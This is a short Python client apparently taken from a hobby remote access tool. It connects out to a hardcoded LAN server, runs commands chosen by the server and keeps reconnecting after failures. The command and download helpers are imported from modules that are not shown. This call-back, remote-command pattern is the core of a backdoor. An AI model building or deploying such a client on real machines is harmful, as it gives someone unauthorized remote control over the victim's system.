from core.connection.conn import *
from core.features.command import *
import time


def selected_option(socket):
    user_input = receive_data(socket)
    print("[+] User selected : ", user_input)
    if user_input == "1":
        run_command()
    elif user_input == "2":
        print("[+] Downloading File")
    elif user_input == "99":
        print("[+] Exiting")
        time.sleep(10)
        return False

    else:
        print("[+] Invalid input")
    return True

if __name__ == "__main__":
    server_ip = "192.168.0.16"
    server_port = 8082
    keep_alive = True
    while keep_alive:
        try:
            socket = ConnectWithServer(server_ip, server_port)
            loopControl = True
            while loopControl:
                loopControl = selected_option(socket)
            socket.close()
        except ConnectionError:
            print("[-] Connection Error ")
            socket.close()
            time.sleep(20)
